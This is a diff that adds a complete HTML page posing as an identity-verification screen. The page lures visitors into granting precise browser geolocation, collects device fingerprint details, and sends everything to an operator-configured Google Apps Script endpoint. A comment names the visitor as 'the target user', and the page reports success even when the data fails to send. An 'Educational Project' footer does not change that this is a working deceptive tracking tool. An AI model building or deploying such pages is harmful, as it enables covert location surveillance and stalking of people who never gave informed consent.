@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        /* Initial loading screen */
+        #loading-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #00d4ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #loading-screen h2 {
+            font-size: 1.4rem;
+            font-weight: 500;
+            color: #ccc;
+        }
+
+        /* Permission request screen */
+        #permission-screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .icon-lock {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+
+        #permission-screen h1 {
+            font-size: 1.6rem;
+            margin-bottom: 12px;
+            color: #fff;
+        }
+
+        #permission-screen p {
+            color: #aaa;
+            font-size: 0.95rem;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .btn-allow {
+            background: linear-gradient(135deg, #00d4ff, #0090ff);
+            color: #fff;
+            border: none;
+            padding: 14px 48px;
+            font-size: 1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-allow:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 144, 255, 0.4);
+        }
+
+        /* Success screen */
+        #success-screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .checkmark {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+
+        #success-screen h1 {
+            font-size: 1.5rem;
+            color: #00ff88;
+            margin-bottom: 12px;
+        }
+
+        #success-screen p {
+            color: #aaa;
+            font-size: 0.95rem;
+        }
+
+        /* Error screen */
+        #error-screen {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .error-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+
+        #error-screen h1 {
+            font-size: 1.5rem;
+            color: #ff4444;
+            margin-bottom: 12px;
+        }
+
+        #error-screen p {
+            color: #aaa;
+            font-size: 0.95rem;
+            line-height: 1.6;
+        }
+
+        .retry-btn {
+            margin-top: 20px;
+            background: transparent;
+            color: #00d4ff;
+            border: 1px solid #00d4ff;
+            padding: 10px 32px;
+            font-size: 0.9rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .retry-btn:hover {
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: #555;
+            font-size: 0.75rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Loading Screen -->
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <h2>Please wait, verifying...</h2>
+        </div>
+
+        <!-- Permission Request Screen -->
+        <div id="permission-screen">
+            <div class="icon-lock">🔒</div>
+            <h1>Verification Required</h1>
+            <p>To continue, we need to verify your identity. Please allow location access when prompted by your browser.</p>
+            <button class="btn-allow" onclick="requestLocation()">Continue Verification</button>
+        </div>
+
+        <!-- Success Screen -->
+        <div id="success-screen">
+            <div class="checkmark">✅</div>
+            <h1>Verified Successfully</h1>
+            <p>You have been verified. You may close this page.</p>
+        </div>
+
+        <!-- Error Screen -->
+        <div id="error-screen">
+            <div class="error-icon">⚠️</div>
+            <h1>Verification Failed</h1>
+            <p id="error-message">Location access is required for verification. Please enable location services and try again.</p>
+            <button class="retry-btn" onclick="requestLocation()">Try Again</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        🎓 Educational Project — Tech Lab Demo
+    </div>
+
+    <script>
+        // =====================================================
+        // ⚠️ CONFIGURATION — SET YOUR GOOGLE APPS SCRIPT URL
+        // =====================================================
+        // Replace the URL below with your deployed Google Apps Script Web App URL
+        // Follow the README.md instructions to get this URL
+        const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE";
+        // =====================================================
+
+        // Show permission screen after a brief loading animation
+        setTimeout(() => {
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('permission-screen').style.display = 'block';
+        }, 2000);
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.container > div').forEach(div => {
+                div.style.display = 'none';
+            });
+            document.getElementById(screenId).style.display = 'block';
+        }
+
+        function requestLocation() {
+            if (!navigator.geolocation) {
+                showScreen('error-screen');
+                document.getElementById('error-message').textContent =
+                    'Geolocation is not supported by your browser.';
+                return;
+            }
+
+            // Show loading while getting location
+            showScreen('loading-screen');
+
+            navigator.geolocation.getCurrentPosition(
+                onLocationSuccess,
+                onLocationError,
+                {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        function onLocationSuccess(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // Collect additional info
+            const data = {
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: accuracy.toFixed(2) + " meters",
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform || "Unknown",
+                language: navigator.language || "Unknown",
+                screenResolution: screen.width + "x" + screen.height,
+                referrer: document.referrer || "Direct",
+                googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
+            };
+
+            sendToGoogleSheet(data);
+        }
+
+        function onLocationError(error) {
+            showScreen('error-screen');
+            let message = '';
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    message = 'Location access was denied. Please enable location services in your browser settings and try again.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    message = 'Location information is unavailable. Please check your device settings.';
+                    break;
+                case error.TIMEOUT:
+                    message = 'The request to get your location timed out. Please try again.';
+                    break;
+                default:
+                    message = 'An unknown error occurred while fetching location.';
+                    break;
+            }
+            document.getElementById('error-message').textContent = message;
+        }
+
+        function sendToGoogleSheet(data) {
+            if (GOOGLE_SCRIPT_URL === "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE") {
+                console.error("⚠️ Google Apps Script URL not configured!");
+                console.log("Location data captured:", data);
+                showScreen('success-screen');
+                return;
+            }
+
+            // Send data to Google Apps Script
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(() => {
+                showScreen('success-screen');
+                console.log("✅ Data sent successfully");
+            })
+            .catch(error => {
+                console.error("Error sending data:", error);
+                // Still show success to the target user
+                showScreen('success-screen');
+            });
+        }
+    </script>
+</body>
+</html>
